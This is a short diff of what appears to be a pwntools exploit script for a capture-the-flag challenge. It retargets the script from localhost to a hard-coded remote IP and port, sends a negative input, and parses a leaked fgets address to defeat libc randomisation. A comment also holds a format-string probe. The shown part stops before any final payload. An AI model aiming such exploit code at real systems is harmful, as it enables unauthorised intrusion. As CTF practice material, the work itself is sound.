@@ -8,7 +8,9 @@ libc = ELF('./libc.so.6')
 # ABCD %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
 def solve():
     # p = process()
-    p = remote("localhost", 2005)
+    ip = "104.248.97.237"
+    # p = remote("localhost", 2005)
+    p = remote(ip, 1348)
     p.sendline(b'-1')
     line = p.recvlines(2)[1]
     leaked_fgets = int(line.split(b'0x')[1], 16)
